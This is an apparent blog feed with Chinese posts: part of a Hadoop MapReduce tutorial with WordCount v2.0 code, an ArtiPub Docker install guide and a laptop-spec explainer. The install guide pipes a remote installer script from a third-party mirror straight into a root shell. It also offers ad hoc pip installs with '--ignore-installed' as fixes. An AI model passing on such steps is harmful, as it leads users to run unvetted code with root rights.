href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/IsolationRunner.html" target="_blank" rel="noopener">IsolationRunner</a> 是帮助调试Map/Reduce程序的工具。</p><p>使用IsolationRunner的方法是，首先设置 keep.failed.task.files属性为true （同时参考keep.task.files.pattern）。</p><p>然后，登录到任务运行失败的节点上，进入 TaskTracker的本地路径运行 IsolationRunner：<br>$ cd <local path>/taskTracker/${taskid}/work<br>$ bin/hadoop org.apache.hadoop.mapred.IsolationRunner ../job.xml</p><p>IsolationRunner会把失败的任务放在单独的一个能够调试的jvm上运行，并且采用和之前完全一样的输入数据。</p><p>Profiling是一个工具，它使用内置的java profiler工具进行分析获得(2-3个)map或reduce样例运行分析报告。</p><p>用户可以通过设置属性mapred.task.profile指定系统是否采集profiler信息。 利用api<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setProfileEnabled(boolean" target="_blank" rel="noopener"> JobConf.setProfileEnabled(boolean)可以修改属性值</a>)。如果设为true， 则开启profiling功能。profiler信息保存在用户日志目录下。缺省情况，profiling功能是关闭的。</p><p>如果用户设定使用profiling功能，可以使用配置文档里的属性 mapred.task.profile.{maps|reduces} 设置要profile map/reduce task的范围。设置该属性值的api是 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setProfileTaskRange(boolean, java.lang.String" target="_blank" rel="noopener">JobConf.setProfileTaskRange(boolean,String)</a>)。 范围的缺省值是0-2。</p><p>用户可以通过设定配置文档里的属性mapred.task.profile.params 来指定profiler配置参数。修改属性要使用api <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setProfileParams(java.lang.String" target="_blank" rel="noopener">JobConf.setProfileParams(String)</a>)。当运行task时，如果字符串包含%s。 它会被替换成profileing的输出文件名。这些参数会在命令行里传递到子JVM中。缺省的profiling 参数是 -agentlib:hprof=cpu=samples,heap=sites,force=n,thread=y,verbose=n,file=%s。</p><p>Map/Reduce框架能够运行用户提供的用于调试的脚本程序。 当map/reduce任务失败时，用户可以通过运行脚本在任务日志（例如任务的标准输出、标准错误、系统日志以及作业配置文件）上做后续处理工作。用户提供的调试脚本程序的标准输出和标准错误会输出为诊断文件。如果需要的话这些输出结果也可以打印在用户界面上。</p><p>在接下来的章节，我们讨论如何与作业一起提交调试脚本。为了提交调试脚本， 首先要把这个脚本分发出去，而且还要在配置文件里设置。</p><p>用户要用 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#DistributedCache" target="_blank" rel="noopener">DistributedCache</a> 机制来<em>分发</em>和<em>链接</em>脚本文件</p><p>一个快速提交调试脚本的方法是分别为需要调试的map任务和reduce任务设置 “mapred.map.task.debug.script” 和 “mapred.reduce.task.debug.script” 属性的值。这些属性也可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapDebugScript(java.lang.String" target="_blank" rel="noopener">JobConf.setMapDebugScript(String) </a>)和 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setReduceDebugScript(java.lang.String" target="_blank" rel="noopener">JobConf.setReduceDebugScript(String) </a>)API来设置。对于streaming， 可以分别为需要调试的map任务和reduce任务使用命令行选项-mapdebug 和 -reducedegug来提交调试脚本。</p><p>脚本的参数是任务的标准输出、标准错误、系统日志以及作业配置文件。在运行map/reduce失败的节点上运行调试命令是：<br>$script $stdout $stderr $syslog $jobconf</p><p>Pipes 程序根据第五个参数获得c++程序名。 因此调试pipes程序的命令是<br>$script $stdout $stderr $syslog $jobconf $program</p><p>对于pipes，默认的脚本会用gdb处理core dump， 打印 stack trace并且给出正在运行线程的信息。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/jobcontrol/package-summary.html" target="_blank" rel="noopener">JobControl</a>是一个工具，它封装了一组Map/Reduce作业以及他们之间的依赖关系。</p><p>Hadoop Map/Reduce框架为应用程序的写入文件操作提供压缩工具，这些工具可以为map输出的中间数据和作业最终输出数据（例如reduce的输出）提供支持。它还附带了一些 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/compress/CompressionCodec.html" target="_blank" rel="noopener">CompressionCodec</a>的实现，比如实现了 <a href="http://www.zlib.net/" target="_blank" rel="noopener">zlib</a>和<a href="http://www.oberhumer.com/opensource/lzo/" target="_blank" rel="noopener">lzo</a>压缩算法。 Hadoop同样支持<a href="http://www.gzip.org/" target="_blank" rel="noopener">gzip</a>文件格式。</p><p>考虑到性能问题（zlib）以及Java类库的缺失（lzo）等因素，Hadoop也为上述压缩解压算法提供本地库的实现。更多的细节请参考 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/native_libraries.html" target="_blank" rel="noopener">这里</a>。</p><p>应用程序可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setCompressMapOutput(boolean" target="_blank" rel="noopener">JobConf.setCompressMapOutput(boolean)</a>)api控制map输出的中间结果，并且可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapOutputCompressorClass(java.lang.Class" target="_blank" rel="noopener">JobConf.setMapOutputCompressorClass(Class)</a>)api指定 CompressionCodec。</p><p>应用程序可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setCompressOutput(org.apache.hadoop.mapred.JobConf, boolean" target="_blank" rel="noopener">FileOutputFormat.setCompressOutput(JobConf, boolean)</a>) api控制输出是否需要压缩并且可以使用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputCompressorClass(org.apache.hadoop.mapred.JobConf, java.lang.Class" target="_blank" rel="noopener">FileOutputFormat.setOutputCompressorClass(JobConf, Class)</a>)api指定CompressionCodec。</p><p>如果作业输出要保存成 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/SequenceFileOutputFormat.html" target="_blank" rel="noopener">SequenceFileOutputFormat</a>格式，需要使用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/SequenceFileOutputFormat.html#setOutputCompressionType(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.io.SequenceFile.CompressionType" target="_blank" rel="noopener">SequenceFileOutputFormat.setOutputCompressionType(JobConf, SequenceFile.CompressionType)</a>)api，来设定 SequenceFile.CompressionType (i.e. RECORD / BLOCK - 默认是RECORD)。</p><h2 id="例子：WordCount-v2-0"><a href="#例子：WordCount-v2-0" class="headerlink" title="例子：WordCount v2.0"></a>例子：WordCount v2.0</h2><p>这里是一个更全面的WordCount例子，它使用了我们已经讨论过的很多Map/Reduce框架提供的功能。</p><p>运行这个例子需要HDFS的某些功能，特别是 DistributedCache相关功能。因此这个例子只能运行在 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#SingleNodeSetup" target="_blank" rel="noopener">伪分布式</a> 或者 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#Fully-Distributed+Operation" target="_blank" rel="noopener">完全分布式模式</a>的 Hadoop上。</p><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">WordCount.java</th></tr></thead><tbody><tr><td style="text-align:center">1.</td><td style="text-align:center">package org.myorg;</td></tr><tr><td style="text-align:center">2.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">3.</td><td style="text-align:center">import java.io.*;</td></tr><tr><td style="text-align:center">4.</td><td style="text-align:center">import java.util.*;</td></tr><tr><td style="text-align:center">5.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">6.</td><td style="text-align:center">import org.apache.hadoop.fs.Path;</td></tr><tr><td style="text-align:center">7.</td><td style="text-align:center">import org.apache.hadoop.filecache.DistributedCache;</td></tr><tr><td style="text-align:center">8.</td><td style="text-align:center">import org.apache.hadoop.conf.*;</td></tr><tr><td style="text-align:center">9.</td><td style="text-align:center">import org.apache.hadoop.io.*;</td></tr><tr><td style="text-align:center">10.</td><td style="text-align:center">import org.apache.hadoop.mapred.*;</td></tr><tr><td style="text-align:center">11.</td><td style="text-align:center">import org.apache.hadoop.util.*;</td></tr><tr><td style="text-align:center">12.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">13.</td><td style="text-align:center">public class WordCount extends Configured implements Tool {</td></tr><tr><td style="text-align:center">14.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">15.</td><td style="text-align:center">public static class Map extends MapReduceBase implements Mapper<LongWritable, Text, Text, IntWritable> {</td></tr><tr><td style="text-align:center">16.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">17.</td><td style="text-align:center">static enum Counters { INPUT_WORDS }</td></tr><tr><td style="text-align:center">18.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">19.</td><td style="text-align:center">private final static IntWritable one = new IntWritable(1);</td></tr><tr><td style="text-align:center">20.</td><td style="text-align:center">private Text word = new Text();</td></tr><tr><td style="text-align:center">21.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">22.</td><td style="text-align:center">private boolean caseSensitive = true;</td></tr><tr><td style="text-align:center">23.</td><td style="text-align:center">private Set<String> patternsToSkip = new HashSet<String>();</td></tr><tr><td style="text-align:center">24.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">25.</td><td style="text-align:center">private long numRecords = 0;</td></tr><tr><td style="text-align:center">26.</td><td style="text-align:center">private String inputFile;</td></tr><tr><td style="text-align:center">27.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">28.</td><td style="text-align:center">public void configure(JobConf job) {</td></tr><tr><td style="text-align:center">29.</td><td style="text-align:center">caseSensitive = job.getBoolean(“wordcount.case.sensitive”, true);</td></tr><tr><td style="text-align:center">30.</td><td style="text-align:center">inputFile = job.get(“map.input.file”);</td></tr><tr><td style="text-align:center">31.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">32.</td><td style="text-align:center">if (job.getBoolean(“wordcount.skip.patterns”, false)) {</td></tr><tr><td style="text-align:center">33.</td><td style="text-align:center">Path[] patternsFiles = new Path[0];</td></tr><tr><td style="text-align:center">34.</td><td style="text-align:center">try {</td></tr><tr><td style="text-align:center">35.</td><td style="text-align:center">patternsFiles = DistributedCache.getLocalCacheFiles(job);</td></tr><tr><td style="text-align:center">36.</td><td style="text-align:center">} catch (IOException ioe) {</td></tr><tr><td style="text-align:center">37.</td><td style="text-align:center">System.err.println(“Caught exception while getting cached files: “ + StringUtils.stringifyException(ioe));</td></tr><tr><td style="text-align:center">38.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">39.</td><td style="text-align:center">for (Path patternsFile : patternsFiles) {</td></tr><tr><td style="text-align:center">40.</td><td style="text-align:center">parseSkipFile(patternsFile);</td></tr><tr><td style="text-align:center">41.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">42.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">43.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">44.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">45.</td><td style="text-align:center">private void parseSkipFile(Path patternsFile) {</td></tr><tr><td style="text-align:center">46.</td><td style="text-align:center">try {</td></tr><tr><td style="text-align:center">47.</td><td style="text-align:center">BufferedReader fis = new BufferedReader(new FileReader(patternsFile.toString()));</td></tr><tr><td style="text-align:center">48.</td><td style="text-align:center">String pattern = null;</td></tr><tr><td style="text-align:center">49.</td><td style="text-align:center">while ((pattern = fis.readLine()) != null) {</td></tr><tr><td style="text-align:center">50.</td><td style="text-align:center">patternsToSkip.add(pattern);</td></tr><tr><td style="text-align:center">51.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">52.</td><td style="text-align:center">} catch (IOException ioe) {</td></tr><tr><td style="text-align:center">53.</td><td style="text-align:center">System.err.println(“Caught exception while parsing the cached file ‘“ + patternsFile + “‘ : “ + StringUtils.stringifyException(ioe));</td></tr><tr><td style="text-align:center">54.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">55.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">56.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">57.</td><td style="text-align:center">public void map(LongWritable key, Text value, OutputCollector<Text, IntWritable> output, Reporter reporter) throws IOException {</td></tr><tr><td style="text-align:center">58.</td><td style="text-align:center">String line = (caseSensitive) ? value.toString() : value.toString().toLowerCase();</td></tr><tr><td style="text-align:center">59.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">60.</td><td style="text-align:center">for (String pattern : patternsToSkip) {</td></tr><tr><td style="text-align:center">61.</td><td style="text-align:center">line = line.replaceAll(pattern, “”);</td></tr><tr><td style="text-align:center">62.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">63.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">64.</td><td style="text-align:center">StringTokenizer tokenizer = new StringTokenizer(line);</td></tr><tr><td style="text-align:center">65.</td><td style="text-align:center">while (tokenizer.hasMoreTokens()) {</td></tr><tr><td style="text-align:center">66.</td><td style="text-align:center">word.set(tokenizer.nextToken());</td></tr><tr><td style="text-align:center">67.</td><td style="text-align:center">output.collect(word, one);</td></tr><tr><td style="text-align:center">68.</td><td style="text-align:center">reporter.incrCounter(Counters.INPUT_WORDS, 1);</td></tr><tr><td style="text-align:center">69.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">70.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">71.</td><td style="text-align:center">if ((++numRecords % 100) == 0) {</td></tr><tr><td style="text-align:center">72.</td><td style="text-align:center">reporter.setStatus(“Finished processing “ + numRecords + “ records “ + “from the input file: “ + inputFile);</td></tr><tr><td style="text-align:center">73.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">74.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">75.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">76.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">77.</td><td style="text-align:center">public static class Reduce extends MapReduceBase implements Reducer<Text, IntWritable, Text, IntWritable> {</td></tr><tr><td style="text-align:center">78.</td><td style="text-align:center">public void reduce(Text key, Iterator<IntWritable> values, OutputCollector<Text, IntWritable> output, Reporter reporter) throws IOException {</td></tr><tr><td style="text-align:center">79.</td><td style="text-align:center">int sum = 0;</td></tr><tr><td style="text-align:center">80.</td><td style="text-align:center">while (values.hasNext()) {</td></tr><tr><td style="text-align:center">81.</td><td style="text-align:center">sum += values.next().get();</td></tr><tr><td style="text-align:center">82.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">83.</td><td style="text-align:center">output.collect(key, new IntWritable(sum));</td></tr><tr><td style="text-align:center">84.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">85.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">86.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">87.</td><td style="text-align:center">public int run(String[] args) throws Exception {</td></tr><tr><td style="text-align:center">88.</td><td style="text-align:center">JobConf conf = new JobConf(getConf(), WordCount.class);</td></tr><tr><td style="text-align:center">89.</td><td style="text-align:center">conf.setJobName(“wordcount”);</td></tr><tr><td style="text-align:center">90.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">91.</td><td style="text-align:center">conf.setOutputKeyClass(Text.class);</td></tr><tr><td style="text-align:center">92.</td><td style="text-align:center">conf.setOutputValueClass(IntWritable.class);</td></tr><tr><td style="text-align:center">93.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">94.</td><td style="text-align:center">conf.setMapperClass(Map.class);</td></tr><tr><td style="text-align:center">95.</td><td style="text-align:center">conf.setCombinerClass(Reduce.class);</td></tr><tr><td style="text-align:center">96.</td><td style="text-align:center">conf.setReducerClass(Reduce.class);</td></tr><tr><td style="text-align:center">97.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">98.</td><td style="text-align:center">conf.setInputFormat(TextInputFormat.class);</td></tr><tr><td style="text-align:center">99.</td><td style="text-align:center">conf.setOutputFormat(TextOutputFormat.class);</td></tr><tr><td style="text-align:center">100.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">101.</td><td style="text-align:center">List<String> other_args = new ArrayList<String>();</td></tr><tr><td style="text-align:center">102.</td><td style="text-align:center">for (int i=0; i &lt; args.length; ++i) {</td></tr><tr><td style="text-align:center">103.</td><td style="text-align:center">if (“-skip”.equals(args[i])) {</td></tr><tr><td style="text-align:center">104.</td><td style="text-align:center">DistributedCache.addCacheFile(new Path(args[++i]).toUri(), conf);</td></tr><tr><td style="text-align:center">105.</td><td style="text-align:center">conf.setBoolean(“wordcount.skip.patterns”, true);</td></tr><tr><td style="text-align:center">106.</td><td style="text-align:center">} else {</td></tr><tr><td style="text-align:center">107.</td><td style="text-align:center">other_args.add(args[i]);</td></tr><tr><td style="text-align:center">108.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">109.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">110.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">111.</td><td style="text-align:center">FileInputFormat.setInputPaths(conf, new Path(other_args.get(0)));</td></tr><tr><td style="text-align:center">112.</td><td style="text-align:center">FileOutputFormat.setOutputPath(conf, new Path(other_args.get(1)));</td></tr><tr><td style="text-align:center">113.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">114.</td><td style="text-align:center">JobClient.runJob(conf);</td></tr><tr><td style="text-align:center">115.</td><td style="text-align:center">return 0;</td></tr><tr><td style="text-align:center">116.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">117.</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">118.</td><td style="text-align:center">public static void main(String[] args) throws Exception {</td></tr><tr><td style="text-align:center">119.</td><td style="text-align:center">int res = ToolRunner.run(new Configuration(), new WordCount(), args);</td></tr><tr><td style="text-align:center">120.</td><td style="text-align:center">System.exit(res);</td></tr><tr><td style="text-align:center">121.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">122.</td><td style="text-align:center">}</td></tr><tr><td style="text-align:center">123.</td></tr></tbody></table></div><p>输入样例：</p><p>$ bin/hadoop dfs -ls /usr/joe/wordcount/input/<br>/usr/joe/wordcount/input/file01<br>/usr/joe/wordcount/input/file02</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file01<br>Hello World, Bye World!</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file02<br>Hello Hadoop, Goodbye to hadoop.</p><p>运行程序：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount /usr/joe/wordcount/input /usr/joe/wordcount/output</p><p>输出：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>Bye 1<br>Goodbye 1<br>Hadoop, 1<br>Hello 2<br>World! 1<br>World, 1<br>hadoop. 1<br>to 1</p><p>注意此时的输入与第一个版本的不同，输出的结果也有不同。</p><p>现在通过DistributedCache插入一个模式文件，文件中保存了要被忽略的单词模式。</p><p>$ hadoop dfs -cat /user/joe/wordcount/patterns.txt<br>.<br>\,<br>!<br>to</p><p>再运行一次，这次使用更多的选项：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount -Dwordcount.case.sensitive=true /usr/joe/wordcount/input /usr/joe/wordcount/output -skip /user/joe/wordcount/patterns.txt</p><p>应该得到这样的输出：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>Bye 1<br>Goodbye 1<br>Hadoop 1<br>Hello 2<br>World 2<br>hadoop 1</p><p>再运行一次，这一次关闭大小写敏感性（case-sensitivity）：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount -Dwordcount.case.sensitive=false /usr/joe/wordcount/input /usr/joe/wordcount/output -skip /user/joe/wordcount/patterns.txt</p><p>输出：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>bye 1<br>goodbye 1<br>hadoop 2<br>hello 2<br>world 2</p><p>通过使用一些Map/Reduce框架提供的功能，WordCount的第二个版本在原始版本基础上有了如下的改进：</p><ul><li>展示了应用程序如何在Mapper (和Reducer)中通过configure方法 修改配置参数(28-43行)。</li><li>展示了作业如何使用DistributedCache 来分发只读数据。 这里允许用户指定单词的模式，在计数时忽略那些符合模式的单词(104行)。</li><li>展示Tool接口和GenericOptionsParser处理Hadoop命令行选项的功能 (87-116, 119行)。</li><li>展示了应用程序如何使用Counters(68行)，如何通过传递给map（和reduce） 方法的Reporter实例来设置应用程序的状态信息(72行)。</li></ul><p><em>Java和JNI是Sun Microsystems, Inc.在美国和其它国家的注册商标。</em></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArtiPub安装</title>
      <link href="2020/06/25/artipub-an-zhuang/"/>
      <url>2020/06/25/artipub-an-zhuang/</url>
      
        <content type="html"><![CDATA[<p>博客一文多发工具我也用过<strong>openwrite</strong>，那个免费版的是真心不好用（接口也有点问题）。</p><p>ArtiPub网上一堆安装教程，但都没法用，这是有原因(<strong>接口很很大问题，原因和后果看最后面~参考资料上一点</strong>)</p><p>网上一堆坑比复制粘贴官方文档，至少我是没有找到能够成功安装的，但经过我<del>睿智</del>沙雕的一番操作之后终于成功安装了，先来看看我自己装的～</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2020-06-2618-01-48的屏幕截图.png" alt=""></p><p>先声明，我用的系统是ubuntu18.04STL，通过docker的方式安装（之前试过先安装好MongoDB再通过源码安装，但这种方式连接不上MongDB，遂弃；另外通过npm的方式，用cnpm命令也无法安装）</p><h2 id="拉取artipub"><a href="#拉取artipub" class="headerlink" title="拉取artipub"></a>拉取artipub</h2><pre class=" language-lang-shell"><code class="language-lang-shell"># 选择一个合适的项目目录git clone git@github.com:crawlab-team/artipub.git</code></pre><p>如果太慢了就自己登陆gitee导入一下<code>git@github.com:crawlab-team/artipub.git</code>吧（记得管理那里改成公开，因为gitee新建仓库默认是私有的）</p><h2 id="安装docker和docker-compose"><a href="#安装docker和docker-compose" class="headerlink" title="安装docker和docker-compose"></a>安装docker和docker-compose</h2><p>官方要求Docker: 18.03版本，Docker Compose: 1.24.1版本，我这里就以安装了指定版本，实际操作中高于此版本应该都可以。</p><h4 id="简单安装"><a href="#简单安装" class="headerlink" title="简单安装"></a>简单安装</h4><p><strong>ubuntu</strong></p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo apt-get update && sudo apt-get install -y vim python-pip curl git pip install docker-compose sudo curl -sSL https://get.daocloud.io/docker | sh                #使用daocloud镜像安装</code></pre><p><strong>centos</strong></p><pre class=" language-lang-shell"><code class="language-lang-shell"> yum update && yum install -y vim python-pip curl git pip install docker-compose sudo curl -sSL https://get.daocloud.io/docker | sh                #使用daocloud镜像安装</code></pre><p>windows用户就对不起啦～</p><p>如果最新版本可以的话就不用安装指定版本的docker和docker-compose了</p><h4 id="安装指定版本docker"><a href="#安装指定版本docker" class="headerlink" title="安装指定版本docker"></a>安装指定版本docker</h4><p>查看可安装的docker版本</p><pre><code>apt-cache madison docker-ce</code></pre><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2020-06-2617-56-12的屏幕截图.png" alt="2020-06-26 17-56-12 的屏幕截图"></p><p>两个| |  之间的 <code>5:19.03.12~3-0~ubuntu-bionic</code>代表着安装来自哪个镜像仓库哪个版本的docker</p><p>例如我要安装清华镜像源的18.06.1版本（倒数第二个），看一下编号是18.06.1~ce~3-0~ubuntu，则在终端输入</p><pre class=" language-lang-shell"><code class="language-lang-shell">apt-get install -y docker-ce=18.06.1~ce~3-0~ubuntu</code></pre><pre class=" language-lang-shell"><code class="language-lang-shell">docker --version #查看版本</code></pre><h4 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h4><pre class=" language-lang-shell"><code class="language-lang-shell">pip install docker-compose==1.24.1</code></pre><p>如果提示<code>ERROR: jsonschema 3.0.1 has requirement ***&gt;=1.11.0, but you&#39;ll have *** 1.10.0 which is incompatible.</code>    那么输入</p><pre class=" language-lang-shell"><code class="language-lang-shell">pip3 install --upgrade --force-reinstall --no-cache-dir jupyter</code></pre><p>（我这是在终端anaconda环境下运行的）</p><p>如果提示<code>ERROR: Cannot uninstall &#39;PyYAML&#39;. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.</code>那么输入:</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo pip install kolla-ansible --ignore-installed PyYAML</code></pre><h2 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h2><p>启动</p><pre><code>docker-compose up -d</code></pre><p>如果提示<code>解决 ERROR: Couldn&#39;t connect to Docker daemon at http+docker://localunixsocket - is it running?</code>,那么先考虑把用户加入docker组（网上一堆扯淡着重启docker）</p><p>运行以下命令</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo gpasswd -a ${USER} docker            #将当前用户加入docker组# 运行上面的命令终端会弹出当前用户名，比如我的用户名叫csz_caixukunsu csz_caixukun            #登陆用户docker-compose up -d</code></pre><p>大功告成，就等着下载安装完mongodb，在浏览器输入<code>http://localhost:8000</code>就能看到开头那个界面了</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2020-06-2617-51-48的屏幕截图.png" alt=""></p><p><strong>然鹅，这个因为版本过久，很多平台已经不能使用了。</strong>目前可用的平台只有<strong>思否</strong>、<strong>简书</strong>(发布到简书上，引用图片链接失败)</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/l2181265/article/details/94351559" target="_blank" rel="noopener">ubuntu16.04安装jupyter问题（后续）</a></p><p><a href="https://blog.csdn.net/xiojing825/article/details/79494408" target="_blank" rel="noopener">解决 ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?  <a href="https://me.csdn.net/xiojing825" target="_blank" rel="noopener">敬__</a></a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五分钟读懂电脑配置</title>
      <link href="2020/06/22/wu-fen-zhong-du-dong-dian-nao-pei-zhi/"/>
      <url>2020/06/22/wu-fen-zhong-du-dong-dian-nao-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>如果不明白电脑配置，那么看到CPU、GPU、内存这些名词也许会头痛。是的，实际解决问题中确实会经常跟这些接触，与其一直懵逼，不如花五分钟的时间了解一下吧。</p><h2 id="读懂电脑配置"><a href="#读懂电脑配置" class="headerlink" title="读懂电脑配置"></a>读懂电脑配置</h2><h3 id="电脑名称"><a href="#电脑名称" class="headerlink" title="电脑名称"></a>电脑名称</h3><p>每次在电商平台购买都会看到长长一串的名称，如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621074731640.png" alt="读懂电脑名称"></p><h3 id="笔记本电脑品牌"><a href="#笔记本电脑品牌" class="headerlink" title="笔记本电脑品牌"></a>笔记本电脑品牌</h3><p>电脑品牌就建议选一线品牌啦，即以下品牌（还有ThinkPad和Surface等等，说好的五分钟嘛，不多说了）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075016084.png" alt="推荐笔记本品牌及其系列"></p><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p>中央处理器简称“CPU”</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075350383.png" alt="CPU分类"></p><p>CUP分为低压、标压、BGA封装H、四核Q，性能依次增强，一般游戏本才搭配H和Q，Q越充电性能越强。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075435563.png" alt="CPU天梯图"></p><p>基本上就代数越高就越强了，傻瓜式判别法，数字大的牛逼。</p><h3 id="GPU"><a href="#GPU" class="headerlink" title="GPU"></a>GPU</h3><p>显卡简称“GPU”</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075552752.png" alt="CPU分类"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075621257.png" alt="显卡天梯图"></p><p>GPU对比同理</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075810392.png" alt="显卡性能对比"></p><h3 id="硬盘"><a href="#硬盘" class="headerlink" title="　硬盘"></a>　硬盘</h3><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075907220.png" alt=""></p><h3 id="屏幕"><a href="#屏幕" class="headerlink" title="屏幕"></a>屏幕</h3><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075947210.png" alt=""></p><p>色域越高颜色越饱和，需要注意的是刷新率不是越高越好，打游戏是刷新率越高越好；设计(3D建模、渲染等)用一般的刷新率即可，否则高刷新率成了累赘。</p><p>整篇文章结束了，有没有五分钟呢？(*σ´∀`)σ</p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
